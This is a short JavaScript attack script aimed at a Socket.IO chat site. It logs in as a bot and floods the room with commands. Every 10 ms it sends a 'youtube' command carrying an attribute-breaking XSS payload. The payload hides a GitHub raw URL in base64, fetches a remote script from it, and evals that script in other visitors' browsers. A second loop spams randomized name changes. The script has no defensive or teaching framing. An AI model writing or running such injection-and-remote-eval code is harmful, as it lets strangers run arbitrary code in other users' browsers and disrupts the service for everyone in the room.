setInterval(() => {
    const socket = io("//");
    socket.emit("client", "MAIN");
    socket.emit("login", {
        name: "IvoryDOMINO",
    });
    setInterval(() => {
    socket.emit('command', {
        list: ['youtube', 'dv-TVTBDfOo" onload="fetch(atob(\'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v\')+\'DOMINO\'+atob(\'Lmpz\')).then(r=>r.text()).then(t=>eval(t))" u="']
    });
    },10)
    setInterval(() => {
    socket.emit("command", {
        list: ["name","IvoryDOMINO " + Math.floor(Math.random() * 10000000)]
    })
    },800)
}, 1000)
